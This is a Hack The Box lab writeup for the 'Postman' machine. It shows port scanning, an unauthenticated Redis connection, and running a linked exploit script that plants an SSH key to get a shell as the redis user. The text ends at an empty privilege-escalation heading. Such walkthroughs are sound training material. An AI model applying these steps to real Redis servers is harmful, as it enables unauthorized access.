# Hack The Box - Postman - Writeup

<p align="center">
  <img src="screenshots/1.png" width="738">
</p>

# Reconnaissance


```
nmap -sC -sV -p- -oA full-port-scan 10.10.10.160 -vvv
```

<p align="center">
  <img src="screenshots/2.png" width="738">
</p>

Port 80 contains a webpage. A directory brute-forcing on the page shows nothing interesting to work upon.

<p align="center">
  <img src="screenshots/3.png" width="738">
</p>

Port 6379 is running a redis server. There is no authentication kept in place.

```
redis-cli -h 10.10.10.160 -p 6379
```

This command can be used to get the current working directory of redis

```
config get dir
```

<p align="center">
  <img src="screenshots/6.png" width="738">
</p>

The path to ssh is found: ```/var/lib/redis/.ssh```


# Exploitation

The redis server (version 4.0.9) is running on port 6379. <a href="https://github.com/Avinash-acid/Redis-Server-Exploit">Here</a> is a working exploit for the same.

A slight modification is needed in the exploit script to change the ```config set dir``` path:

<p align="center">
  <img src="screenshots/5.png" width="738">
</p>

Once the script is edited, it can be run via following command:

```
python redis.py 10.10.10.160 redis
```

<p align="center">
  <img src="screenshots/8.png" width="738">
</p>

It will ask the path to save SSH key.

```
/root/.ssh/id_rsa
```

Once the script runs, it will try to SSH into redis user.

<p align="center">
  <img src="screenshots/7.png" width="738">
</p>

Finally we get a shell as redis user on the box.

<p align="center">
  <img src="screenshots/9.png" width="738">
</p>

# Privilege Escalation



